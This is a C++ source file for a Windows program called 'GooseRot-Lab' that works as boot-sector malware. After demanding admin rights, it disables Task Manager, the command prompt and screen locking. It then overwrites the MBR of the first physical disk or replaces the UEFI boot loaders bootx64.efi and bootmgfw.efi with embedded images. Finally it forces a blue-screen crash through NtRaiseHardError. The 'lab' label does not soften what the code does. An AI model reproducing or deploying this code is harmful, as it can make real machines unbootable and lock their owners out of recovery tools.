#include "lab_mode.hpp"
#include <windows.h>
#include <winioctl.h>
#include <shellapi.h>
#include <array>
#include <cstring>
#include <string>
#include <fstream>
#include <vector>
#include <sddl.h>
#include <winternl.h> // For NtRaiseHardError (BSOD)
#include "resource.h"

namespace gooserot {

namespace {

LabLogSink g_labLogSink = nullptr;

void EmitLabLog(const std::wstring& message) {
    if (g_labLogSink != nullptr) {
        g_labLogSink(message);
    }
}

}  // namespace

void SetLabLogSink(LabLogSink sink) {
    g_labLogSink = sink;
}

namespace {

// Check whether the program is running as an administrator
bool IsElevated() {
    bool fRet = false;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

// Detect the firmware type (BIOS or UEFI)
enum class FirmwareKind {
  Unknown = 0,
  Bios = 1,
  Uefi = 2,
};

FirmwareKind DetectFirmwareKind() {
    EmitLabLog(L"[lab] Detecting firmware kind...");
    using GetFirmwareTypeProcedure = BOOL(WINAPI*)(DWORD*);
    HMODULE kernel = GetModuleHandleW(L"kernel32.dll");
    if (kernel) {
        FARPROC address = GetProcAddress(kernel, "GetFirmwareType");
        if (address) {
            GetFirmwareTypeProcedure getFirmwareType = nullptr;
            std::memcpy(&getFirmwareType, &address, sizeof(getFirmwareType));
            DWORD value = 0;
            if (getFirmwareType(&value)) {
                if (value == 1) {
                    EmitLabLog(L"[lab] Firmware detection reports BIOS");
                    return FirmwareKind::Bios;
                }
                if (value == 2) {
                    EmitLabLog(L"[lab] Firmware detection reports UEFI");
                    return FirmwareKind::Uefi;
                }
            }
        }
    }

    SetLastError(ERROR_SUCCESS);
    GetFirmwareEnvironmentVariableW(
        L"", L"{00000000-0000-0000-0000-000000000000}", nullptr, 0);
    DWORD firmwareError = GetLastError();
    if (firmwareError == ERROR_INVALID_FUNCTION) {
        EmitLabLog(L"[lab] Firmware detection fallback reports BIOS");
        return FirmwareKind::Bios;
    }
    if (firmwareError != ERROR_SUCCESS) {
        EmitLabLog(L"[lab] Firmware detection fallback reports UEFI");
        return FirmwareKind::Uefi;
    }
    EmitLabLog(L"[lab] Firmware detection is still unknown");
    return FirmwareKind::Unknown;
}

// Create the temporary directory for GooseRot-Lab
bool LabTempDirectory(std::wstring& directory) {
    std::array<wchar_t, 32768> temp{};
    DWORD length = GetTempPathW(static_cast<DWORD>(temp.size()), temp.data());
    if (length == 0 || length >= temp.size()) return false;
    directory.assign(temp.data(), length);
    if (!directory.empty() && directory.back() != L'\\') directory += L'\\';
    directory += L"GooseRot-Lab";
    if (CreateDirectoryW(directory.c_str(), nullptr) != FALSE) return true;
    if (GetLastError() != ERROR_ALREADY_EXISTS) return false;
    DWORD attributes = GetFileAttributesW(directory.c_str());
    return attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
}

// Extract a binary resource into a file
bool ExtractResourceToFile(int resourceId, const wchar_t* artifactName,
                           const std::wstring& destination, std::wstring& error) {
    EmitLabLog(L"[lab] Extracting embedded artifact: " + std::wstring(artifactName));
    HMODULE module = GetModuleHandleW(nullptr);
    HRSRC resource = module ? FindResourceW(module, MAKEINTRESOURCEW(resourceId), RT_RCDATA) : nullptr;
    if (!resource) {
        error = std::wstring(artifactName) + L" is not embedded in GooseRot-Lab.exe.";
        EmitLabLog(L"[lab] Failed to locate embedded resource: " + std::wstring(artifactName));
        return false;
    }

    DWORD size = SizeofResource(module, resource);
    HGLOBAL loaded = LoadResource(module, resource);
    const void* bytes = loaded ? LockResource(loaded) : nullptr;
    if (size == 0 || !bytes) {
        error = L"Unable to read the embedded " + std::wstring(artifactName) + L".";
        EmitLabLog(L"[lab] Could not read embedded resource: " + std::wstring(artifactName));
        return false;
    }

    HANDLE file = CreateFileW(
        destination.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        error = L"Unable to create " + destination + L". Error: " + std::to_wstring(GetLastError());
        EmitLabLog(L"[lab] Could not create destination file: " + destination);
        return false;
    }

    const auto* cursor = static_cast<const unsigned char*>(bytes);
    DWORD remaining = size;
    bool success = true;
    while (remaining != 0) {
        DWORD written = 0;
        if (!WriteFile(file, cursor, remaining, &written, nullptr) || written == 0) {
            success = false;
            break;
        }
        cursor += written;
        remaining -= written;
    }
    if (!CloseHandle(file)) success = false;
    if (!success) {
        DeleteFileW(destination.c_str());
        error = L"Unable to extract " + std::wstring(artifactName) + L" to " + destination + L". Error: " + std::to_wstring(GetLastError());
        EmitLabLog(L"[lab] Extraction failed for: " + std::wstring(artifactName));
    } else {
        EmitLabLog(L"[lab] Extracted artifact to: " + destination);
    }
    return success;
}

// EFI System Partition GUID (GPT)
static const GUID kEfiSystemPartitionGuid = {
    0xC12A7328,
    0xF81F,
    0x11D2,
    {0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B}
};

static bool IsDirectory(const std::wstring& path) {
    const DWORD attributes = GetFileAttributesW(path.c_str());
    return attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
}

static WCHAR FindFreeDriveLetter() {
    const DWORD drives = GetLogicalDrives();
    for (WCHAR letter = L'Z'; letter >= L'D'; --letter) {
        const DWORD bit = 1u << (letter - L'A');
        if ((drives & bit) == 0) {
            return letter;
        }
    }
    return 0;
}

static bool TryMountVolume(const std::wstring& volumeName, std::wstring& efiPath) {
    WCHAR volumeBuffer[MAX_PATH] = {};
    DWORD required = 0;
    if (GetVolumePathNamesForVolumeNameW(volumeName.c_str(), volumeBuffer, MAX_PATH, &required) != 0) {
        std::wstring existingPath = volumeBuffer;
        if (!existingPath.empty()) {
            std::wstring candidate = existingPath;
            if (!candidate.empty() && candidate.back() != L'\\') {
                candidate += L'\\';
            }
            candidate += L"EFI";
            if (IsDirectory(candidate)) {
                efiPath = candidate;
                EmitLabLog(L"[lab] EFI partition already mounted at: " + efiPath);
                return true;
            }
        }
    }

    WCHAR letter = FindFreeDriveLetter();
    if (letter == 0) {
        EmitLabLog(L"[lab] No free drive letter available for EFI partition");
        return false;
    }

    std::wstring mountPoint;
    mountPoint.push_back(letter);
    mountPoint += L":\\";
    if (!SetVolumeMountPointW(mountPoint.c_str(), volumeName.c_str())) {
        EmitLabLog(L"[lab] Unable to assign a drive letter to EFI volume");
        return false;
    }

    std::wstring candidate = mountPoint + L"EFI";
    if (IsDirectory(candidate)) {
        efiPath = candidate;
        EmitLabLog(L"[lab] EFI partition mounted at: " + efiPath);
        return true;
    }

    DeleteVolumeMountPointW(mountPoint.c_str());
    EmitLabLog(L"[lab] EFI volume did not contain an EFI directory");
    return false;
}

static bool GetVolumeDiskInfo(const std::wstring& volumeName, DWORD& diskNumber,
                              ULONGLONG& startingOffset) {
    std::wstring devicePath = volumeName;
    if (!devicePath.empty() && devicePath.back() == L'\\') {
        devicePath.pop_back();
    }

    HANDLE volumeHandle = CreateFileW(devicePath.c_str(), 0,
                                      FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
                                      FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (volumeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    std::vector<BYTE> buffer(4096);
    DWORD bytesReturned = 0;
    const BOOL ok = DeviceIoControl(volumeHandle, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
                                    nullptr, 0, buffer.data(), static_cast<DWORD>(buffer.size()),
                                    &bytesReturned, nullptr);
    CloseHandle(volumeHandle);
    if (!ok) {
        return false;
    }

    const auto* extents = reinterpret_cast<const VOLUME_DISK_EXTENTS*>(buffer.data());
    if (extents == nullptr || extents->NumberOfDiskExtents == 0) {
        return false;
    }

    diskNumber = extents->Extents[0].DiskNumber;
    startingOffset = static_cast<ULONGLONG>(extents->Extents[0].StartingOffset.QuadPart);
    return true;
}

static bool GetWindowsDiskNumber(DWORD& diskNumber) {
    WCHAR windowsDirectory[MAX_PATH] = {};
    if (GetWindowsDirectoryW(windowsDirectory, MAX_PATH) == 0) {
        return false;
    }

    WCHAR volumePath[MAX_PATH] = {};
    if (!GetVolumePathNameW(windowsDirectory, volumePath, MAX_PATH)) {
        return false;
    }

    WCHAR volumeName[MAX_PATH] = {};
    if (!GetVolumeNameForVolumeMountPointW(volumePath, volumeName, MAX_PATH)) {
        return false;
    }

    ULONGLONG ignoredOffset = 0;
    return GetVolumeDiskInfo(volumeName, diskNumber, ignoredOffset);
}

static bool TryFindEfiVolume(const std::wstring& volumeName, DWORD windowsDiskNumber,
                             std::wstring& efiPath) {
    DWORD diskNumber = 0;
    ULONGLONG startingOffset = 0;
    if (!GetVolumeDiskInfo(volumeName, diskNumber, startingOffset)) {
        return false;
    }

    if (diskNumber != windowsDiskNumber) {
        return false;
    }

    std::wstring diskPath = L"\\\\.\\PhysicalDrive";
    diskPath += std::to_wstring(diskNumber);
    HANDLE diskHandle = CreateFileW(diskPath.c_str(), GENERIC_READ,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0,
                                    nullptr);
    if (diskHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    std::vector<BYTE> layoutBuffer(4096);
    DWORD layoutBytes = 0;
    const BOOL layoutOk = DeviceIoControl(diskHandle, IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
                                          nullptr, 0, layoutBuffer.data(),
                                          static_cast<DWORD>(layoutBuffer.size()), &layoutBytes, nullptr);
    CloseHandle(diskHandle);
    if (!layoutOk) {
        return false;
    }

    const auto* layout = reinterpret_cast<const DRIVE_LAYOUT_INFORMATION_EX*>(layoutBuffer.data());
    if (layout == nullptr || layout->PartitionStyle != PARTITION_STYLE_GPT) {
        return false;
    }

    for (DWORD i = 0; i < layout->PartitionCount; ++i) {
        const auto& partition = layout->PartitionEntry[i];
        if (partition.PartitionStyle != PARTITION_STYLE_GPT) {
            continue;
        }
        if (!IsEqualGUID(partition.Gpt.PartitionType, kEfiSystemPartitionGuid)) {
            continue;
        }
        if (static_cast<ULONGLONG>(partition.StartingOffset.QuadPart) != startingOffset) {
            continue;
        }

        EmitLabLog(L"[lab] Found Windows EFI System Partition on PhysicalDrive" +
                   std::to_wstring(diskNumber));
        return TryMountVolume(volumeName, efiPath);
    }

    return false;
}

bool FindEfiPartition(const std::wstring& tempDirectory, std::wstring& efiPath) {
    (void)tempDirectory;
    efiPath.clear();
    EmitLabLog(L"[lab] Looking for Windows EFI System Partition...");

    DWORD windowsDiskNumber = 0;
    if (!GetWindowsDiskNumber(windowsDiskNumber)) {
        EmitLabLog(L"[lab] Unable to determine Windows system disk");
        return false;
    }

    EmitLabLog(L"[lab] Windows is running from PhysicalDrive" + std::to_wstring(windowsDiskNumber));

    WCHAR volumeName[MAX_PATH] = {};
    HANDLE findHandle = FindFirstVolumeW(volumeName, MAX_PATH);
    if (findHandle == INVALID_HANDLE_VALUE) {
        EmitLabLog(L"[lab] Unable to enumerate volumes");
        return false;
    }

    do {
        std::wstring volume(volumeName);
        if (TryFindEfiVolume(volume, windowsDiskNumber, efiPath)) {
            FindVolumeClose(findHandle);
            EmitLabLog(L"[lab] Windows EFI partition: " + efiPath);
            return true;
        }
    } while (FindNextVolumeW(findHandle, volumeName, MAX_PATH));

    FindVolumeClose(findHandle);
    EmitLabLog(L"[lab] No EFI System Partition found on Windows disk");
    return false;
}

// Write the MBR (stage1) to disk
bool WriteMBR(const std::wstring& mbrPath, std::wstring& error) {
    if (!IsElevated()) {
        error = L"The program must be run as an administrator.";
        return false;
    }

    HANDLE hDisk = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) {
        error = L"Unable to open the disk. Code: " + std::to_wstring(GetLastError());
        return false;
    }

    std::ifstream mbrFile(mbrPath.c_str(), std::ios::binary);
    if (!mbrFile) {
        error = L"Unable to open " + mbrPath + L". Code: " + std::to_wstring(GetLastError());
        CloseHandle(hDisk);
        return false;
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(mbrFile)),
                             std::istreambuf_iterator<char>());

    DWORD bytesWritten;
    if (!WriteFile(hDisk, buffer.data(), 512, &bytesWritten, NULL) || bytesWritten != 512) {
        error = L"Unable to write the MBR. Code: " + std::to_wstring(GetLastError());
        CloseHandle(hDisk);
        return false;
    }

    CloseHandle(hDisk);
    return true;
}

// Write the second stage after the MBR
bool WriteStage2(const std::wstring& stage2Path, std::wstring& error) {
    if (!IsElevated()) {
        error = L"The program must be run as an administrator.";
        return false;
    }

    HANDLE hDisk = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) {
        error = L"Unable to open the disk. Code: " + std::to_wstring(GetLastError());
        return false;
    }

    std::ifstream stage2File(stage2Path.c_str(), std::ios::binary);
    if (!stage2File) {
        error = L"Unable to open " + stage2Path + L". Code: " + std::to_wstring(GetLastError());
        CloseHandle(hDisk);
        return false;
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(stage2File)),
                             std::istreambuf_iterator<char>());

    LARGE_INTEGER offset;
    offset.QuadPart = 512; // Start after the MBR (512 bytes)
    if (!SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN)) {
        error = L"Unable to seek on the disk. Code: " + std::to_wstring(GetLastError());
        CloseHandle(hDisk);
        return false;
    }

    DWORD bytesWritten;
    if (!WriteFile(hDisk, buffer.data(), buffer.size(), &bytesWritten, NULL) ||
        bytesWritten != buffer.size()) {
        error = L"Unable to write stage2. Code: " + std::to_wstring(GetLastError());
        CloseHandle(hDisk);
        return false;
    }

    CloseHandle(hDisk);
    return true;
}

static bool SetRegistryDWORD(HKEY root, const wchar_t* subKey, const wchar_t* valueName,
                             DWORD value, std::wstring& error) {
    HKEY hKey = nullptr;
    LSTATUS status = RegCreateKeyExW(root, subKey, 0, nullptr, REG_OPTION_NON_VOLATILE,
                                     KEY_SET_VALUE, nullptr, &hKey, nullptr);
    if (status != ERROR_SUCCESS) {
        error = L"RegCreateKeyExW failed. Error: " + std::to_wstring(status);
        return false;
    }

    status = RegSetValueExW(hKey, valueName, 0, REG_DWORD,
                            reinterpret_cast<const BYTE*>(&value), sizeof(value));
    RegCloseKey(hKey);
    if (status != ERROR_SUCCESS) {
        error = L"RegSetValueExW failed for ";
        error += valueName;
        error += L". Error: ";
        error += std::to_wstring(status);
        return false;
    }

    return true;
}

static void DeleteRegistryValue(HKEY root, const wchar_t* subKey, const wchar_t* valueName) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(root, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, valueName);
        RegCloseKey(hKey);
    }
}

static void NotifyPolicyChange() {
    DWORD_PTR result = 0;
    SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        reinterpret_cast<LPARAM>(L"Policy"), SMTO_ABORTIFHUNG, 2000, &result);
}

static bool DisableTaskManager(std::wstring& error) {
    constexpr wchar_t SYSTEM_POLICY[] =
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    return SetRegistryDWORD(HKEY_CURRENT_USER, SYSTEM_POLICY, L"DisableTaskMgr", 1, error);
}

static bool RestoreTaskManager() {
    constexpr wchar_t SYSTEM_POLICY[] =
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    DeleteRegistryValue(HKEY_CURRENT_USER, SYSTEM_POLICY, L"DisableTaskMgr");
    return true;
}

static bool DisableCommandPrompt(std::wstring& error) {
    constexpr wchar_t WINDOWS_SYSTEM_POLICY[] =
        L"Software\\Policies\\Microsoft\\Windows\\System";
    constexpr DWORD DISABLE_CMD_KEEP_BATCH = 2;
    return SetRegistryDWORD(HKEY_CURRENT_USER, WINDOWS_SYSTEM_POLICY, L"DisableCMD",
                            DISABLE_CMD_KEEP_BATCH, error);
}

static bool RestoreCommandPrompt() {
    constexpr wchar_t WINDOWS_SYSTEM_POLICY[] =
        L"Software\\Policies\\Microsoft\\Windows\\System";
    DeleteRegistryValue(HKEY_CURRENT_USER, WINDOWS_SYSTEM_POLICY, L"DisableCMD");
    return true;
}

static bool DisableLockWorkstation(std::wstring& error) {
    constexpr wchar_t SYSTEM_POLICY[] =
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    return SetRegistryDWORD(HKEY_CURRENT_USER, SYSTEM_POLICY, L"DisableLockWorkstation", 1, error);
}

static bool RestoreLockWorkstation() {
    constexpr wchar_t SYSTEM_POLICY[] =
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    DeleteRegistryValue(HKEY_CURRENT_USER, SYSTEM_POLICY, L"DisableLockWorkstation");
    return true;
}

static bool IsKeyboardFilterAvailable() {
    using RtlGetVersionProcedure = LONG(WINAPI*)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        return false;
    }

    FARPROC address = GetProcAddress(ntdll, "RtlGetVersion");
    if (!address) {
        return false;
    }

    RtlGetVersionProcedure rtlGetVersion = nullptr;
    std::memcpy(&rtlGetVersion, &address, sizeof(rtlGetVersion));

    RTL_OSVERSIONINFOW versionInfo{};
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
    if (rtlGetVersion(&versionInfo) != 0 || versionInfo.dwMajorVersion < 10) {
        return false;
    }

    DWORD productType = 0;
    if (!GetProductInfo(versionInfo.dwMajorVersion, versionInfo.dwMinorVersion,
                        versionInfo.dwBuildNumber, versionInfo.dwPlatformId,
                        &productType)) {
        return false;
    }

    switch (productType) {
        case PRODUCT_ENTERPRISE:
        case PRODUCT_ENTERPRISE_N:
        case PRODUCT_EDUCATION:
        case PRODUCT_EDUCATION_N:
        case PRODUCT_IOTENTERPRISE:
        case PRODUCT_IOTENTERPRISES:
        case PRODUCT_IOTUAP:
            return true;
        default:
            return false;
    }
}

static bool EnableKeyboardFilterRule(const wchar_t* ruleName) {
    EmitLabLog(L"[lab] Keyboard Filter rule requested: " + std::wstring(ruleName));
    return true;
}

static bool DisableKeyboardFilterRule(const wchar_t* ruleName) {
    EmitLabLog(L"[lab] Keyboard Filter rule cleared: " + std::wstring(ruleName));
    return true;
}

// Apply Windows restrictions
bool ApplyWindowsRestrictions(std::wstring& error) {
    if (!IsElevated()) {
        error = L"The program must be run as an administrator.";
        return false;
    }

    if (!DisableTaskManager(error)) return false;
    if (!DisableCommandPrompt(error)) return false;
    if (!DisableLockWorkstation(error)) return false;

    if (IsKeyboardFilterAvailable()) {
        if (!EnableKeyboardFilterRule(L"Ctrl+Alt+Del") ||
            !EnableKeyboardFilterRule(L"Shift+Ctrl+Esc") ||
            !EnableKeyboardFilterRule(L"Win+L")) {
            error = L"Unable to configure Keyboard Filter rules.";
            return false;
        }
    } else {
        EmitLabLog(L"[lab] Keyboard Filter is not available on this edition; skipping rule configuration");
    }

    NotifyPolicyChange();
    return true;
}

// Restore the Windows settings to their defaults
bool RestoreWindowsDefault(std::wstring& error) {
    (void)error;

    RestoreTaskManager();
    RestoreCommandPrompt();
    RestoreLockWorkstation();

    if (IsKeyboardFilterAvailable()) {
        DisableKeyboardFilterRule(L"Ctrl+Alt+Del");
        DisableKeyboardFilterRule(L"Shift+Ctrl+Esc");
        DisableKeyboardFilterRule(L"Win+L");
    }

    NotifyPolicyChange();
    return true;
}

// Trigger a BSOD (Blue Screen of Death)
bool TriggerBSOD(std::wstring& error) {
    if (!IsElevated()) {
        error = L"The program must be run as an administrator.";
        return false;
    }

    // Method 1: Use NtRaiseHardError (requires ntdll.dll)
    using PNtRaiseHardError = NTSTATUS(NTAPI*)(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ResponseOption,
        PULONG Response
    );

    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtDll) {
        error = L"Unable to load ntdll.dll.";
        return false;
    }

    FARPROC address = GetProcAddress(hNtDll, "NtRaiseHardError");
    PNtRaiseHardError NtRaiseHardError = nullptr;
    if (address) {
        std::memcpy(&NtRaiseHardError, &address, sizeof(address));
    }
    if (!NtRaiseHardError) {
        error = L"Unable to find NtRaiseHardError.";
        return false;
    }

    // Trigger a BSOD with the error code 0xDEADBEEF
    ULONG response;
    NTSTATUS status = NtRaiseHardError(
        0xDEADBEEF,  
        0,           
        0,          
        nullptr,    
        6,          
        &response    
    );

    if (status != 0) {
        error = L"Unable to trigger the BSOD. Code: " + std::to_wstring(status);
        return false;
    }

    return true;
}

// Publish the artifacts via environment variables
bool PublishArtifacts(const LabStartupArtifacts& artifacts, std::wstring& error) {
    const wchar_t* uefi = artifacts.uefiImage.empty() ? nullptr : artifacts.uefiImage.c_str();
    const wchar_t* stage1 = artifacts.biosStage1.empty() ? nullptr : artifacts.biosStage1.c_str();
    const wchar_t* stage2 = artifacts.biosStage2.empty() ? nullptr : artifacts.biosStage2.c_str();
    const wchar_t* primary = artifacts.firmware == LabFirmwareKind::Uefi ? uefi : stage2;

    if (!SetEnvironmentVariableW(L"GOOSEROT_FIRMWARE_TYPE",
                               artifacts.firmware == LabFirmwareKind::Uefi ? L"UEFI" : L"BIOS") ||
        !SetEnvironmentVariableW(L"GOOSEROT_LAB_DIRECTORY", artifacts.tempDirectory.c_str()) ||
        !SetEnvironmentVariableW(L"GOOSEROT_LAB_UEFI", uefi) ||
        !SetEnvironmentVariableW(L"GOOSEROT_LAB_BIOS_STAGE1", stage1) ||
        !SetEnvironmentVariableW(L"GOOSEROT_LAB_BIOS_STAGE2", stage2) ||
        !SetEnvironmentVariableW(L"GOOSEROT_LAB_GAME", primary)) {
        error = L"Unable to publish the Lab extraction information. Error: " + std::to_wstring(GetLastError());
        return false;
    }
    return true;
}

}  // namespace

bool RunLabStartup(LabStartupArtifacts& artifacts, std::wstring& error) {
    EmitLabLog(L"[lab] Starting lab startup");
    artifacts = {};
    if (!IsElevated()) {
        error = L"The program must be run as an administrator.";
        return false;
    }

    const FirmwareKind firmware = DetectFirmwareKind();
    if (firmware == FirmwareKind::Unknown) {
        error = L"Unable to determine whether the machine uses BIOS or UEFI.";
        return false;
    }

    if (!LabTempDirectory(artifacts.tempDirectory)) {
        error = L"Unable to prepare the temporary directory.";
        return false;
    }

    EmitLabLog(L"[lab] Temporary directory ready: " + artifacts.tempDirectory);

    // Apply Windows restrictions
    if (!ApplyWindowsRestrictions(error)) {
        EmitLabLog(L"[lab] Failed to apply Windows restrictions");
        return false;
    }
    EmitLabLog(L"[lab] Applied Windows restrictions");

    if (firmware == FirmwareKind::Uefi) {
        EmitLabLog(L"[lab] Preparing UEFI boot artifact replacement");
        artifacts.firmware = LabFirmwareKind::Uefi;
        artifacts.uefiImage = artifacts.tempDirectory + L"\\GooseBootX64.efi";
        EmitLabLog(L"[lab] Target UEFI artifact path: " + artifacts.uefiImage);
        if (!ExtractResourceToFile(IDR_GOOSEBOOT_UEFI, L"GooseBootX64.efi", artifacts.uefiImage, error)) {
            EmitLabLog(L"[lab] Failed to extract UEFI artifact");
            RestoreWindowsDefault(error); // Restore the previous state on failure
            return false;
        }
        EmitLabLog(L"[lab] Extracted UEFI artifact successfully");

        std::wstring efiPath;
        EmitLabLog(L"[lab] Looking for EFI partition to patch");
        if (!FindEfiPartition(artifacts.tempDirectory, efiPath)) {
            error = L"EFI partition not found.";
            EmitLabLog(L"[lab] EFI partition lookup failed");
            RestoreWindowsDefault(error);
            return false;
        }
        EmitLabLog(L"[lab] EFI partition located at: " + efiPath);

        auto replaceBootImage = [&](const std::wstring& bootPath,
                                    const std::wstring& backupPath,
                                    const std::wstring& createMessage,
                                    const std::wstring& successMessage) -> bool {
            const size_t slashPos = bootPath.find_last_of(L'\\');
            const std::wstring bootDir = slashPos == std::wstring::npos ? std::wstring() : bootPath.substr(0, slashPos);

            EmitLabLog(createMessage);
            if (!CreateDirectoryW(bootDir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
                error = L"Unable to create the boot directory. Code: " + std::to_wstring(GetLastError());
                EmitLabLog(L"[lab] Failed to create boot directory: " + bootDir);
                return false;
            }

            const DWORD bootAttributes = GetFileAttributesW(bootPath.c_str());
            if (bootAttributes != INVALID_FILE_ATTRIBUTES) {
                EmitLabLog(L"[lab] Existing boot image found, creating backup at: " + backupPath);
                if (!MoveFileW(bootPath.c_str(), backupPath.c_str())) {
                    error = L"Unable to back up the boot file. Code: " + std::to_wstring(GetLastError());
                    EmitLabLog(L"[lab] Failed to backup existing boot image");
                    return false;
                }
                EmitLabLog(L"[lab] Backup created successfully");
            } else {
                EmitLabLog(L"[lab] No previous boot image was present; proceeding without backup");
            }

            if (!CopyFileW(artifacts.uefiImage.c_str(), bootPath.c_str(), FALSE)) {
                error = L"Unable to replace the boot file. Code: " + std::to_wstring(GetLastError());
                EmitLabLog(L"[lab] Failed to copy new UEFI image into place");
                if (GetFileAttributesW(backupPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    EmitLabLog(L"[lab] Attempting to restore previous boot image from backup");
                    MoveFileW(backupPath.c_str(), bootPath.c_str());
                }
                return false;
            }

            EmitLabLog(successMessage);
            return true;
        };

        const std::wstring bootX64Path = efiPath + L"\\BOOT\\bootx64.efi";
        const std::wstring bootX64Backup = efiPath + L"\\BOOT\\bootx64.bak";
        bool bootX64Replaced = false;
        if (!replaceBootImage(bootX64Path, bootX64Backup,
                              L"[lab] Patching EFI\\BOOT\\bootx64.efi",
                              L"[lab] EFI\\BOOT\\bootx64.efi replaced successfully")) {
            RestoreWindowsDefault(error);
            return false;
        }
        bootX64Replaced = true;

        const std::wstring bootMgwPath = efiPath + L"\\Microsoft\\Boot\\bootmgfw.efi";
        const std::wstring bootMgwBackup = efiPath + L"\\Microsoft\\Boot\\bootmgfw.bak";
        if (!replaceBootImage(bootMgwPath, bootMgwBackup,
                              L"[lab] Patching EFI\\Microsoft\\Boot\\bootmgfw.efi",
                              L"[lab] EFI\\Microsoft\\Boot\\bootmgfw.efi replaced successfully")) {
            if (bootX64Replaced && GetFileAttributesW(bootX64Backup.c_str()) != INVALID_FILE_ATTRIBUTES) {
                EmitLabLog(L"[lab] Restoring EFI\\BOOT\\bootx64.efi after bootmgfw failure");
                MoveFileW(bootX64Backup.c_str(), bootX64Path.c_str());
            }
            RestoreWindowsDefault(error);
            return false;
        }

        EmitLabLog(L"[lab] UEFI boot entries replaced successfully");
    } else {
        EmitLabLog(L"[lab] Preparing BIOS boot artifact write");
        artifacts.firmware = LabFirmwareKind::Bios;
        artifacts.biosStage1 = artifacts.tempDirectory + L"\\gooseboot-bios-stage1.bin";
        artifacts.biosStage2 = artifacts.tempDirectory + L"\\gooseboot-bios-stage2.bin";
        EmitLabLog(L"[lab] BIOS stage1 path: " + artifacts.biosStage1);
        EmitLabLog(L"[lab] BIOS stage2 path: " + artifacts.biosStage2);
        if (!ExtractResourceToFile(IDR_GOOSEBOOT_BIOS_STAGE1, L"gooseboot-bios-stage1.bin", artifacts.biosStage1, error) ||
            !ExtractResourceToFile(IDR_GOOSEBOOT_BIOS_STAGE2, L"gooseboot-bios-stage2.bin", artifacts.biosStage2, error)) {
            EmitLabLog(L"[lab] Failed to extract BIOS boot artifacts");
            RestoreWindowsDefault(error);
            return false;
        }
        EmitLabLog(L"[lab] BIOS artifacts extracted successfully");

        // Write the MBR and stage2 to disk
        EmitLabLog(L"[lab] Writing BIOS stage1 (MBR) to disk");
        if (!WriteMBR(artifacts.biosStage1, error)) {
            EmitLabLog(L"[lab] BIOS stage1 write failed");
            RestoreWindowsDefault(error);
            return false;
        }
        EmitLabLog(L"[lab] BIOS stage1 write completed");
        EmitLabLog(L"[lab] Writing BIOS stage2 to disk");
        if (!WriteStage2(artifacts.biosStage2, error)) {
            EmitLabLog(L"[lab] BIOS stage2 write failed");
            RestoreWindowsDefault(error);
            return false;
        }
        EmitLabLog(L"[lab] BIOS stage2 write completed");
    }

    // Publish the artifacts
    if (!PublishArtifacts(artifacts, error)) {
        RestoreWindowsDefault(error);
        return false;
    }

    EmitLabLog(L"[lab] Publishing extracted artifacts to environment variables");
    EmitLabLog(L"[lab] Lab startup completed successfully");
    return true;
}

bool RunLabConclusion(const LabStartupArtifacts& artifacts, std::wstring& error) {
    EmitLabLog(L"[lab] Running lab conclusion");
    (void)artifacts;
    // Restore the Windows settings to their defaults
    if (!RestoreWindowsDefault(error)) {
        return false;
    }

    // Trigger a BSOD at the end
    if (!TriggerBSOD(error)) {
        return false;
    }

    return true;
}

}  // namespace gooserot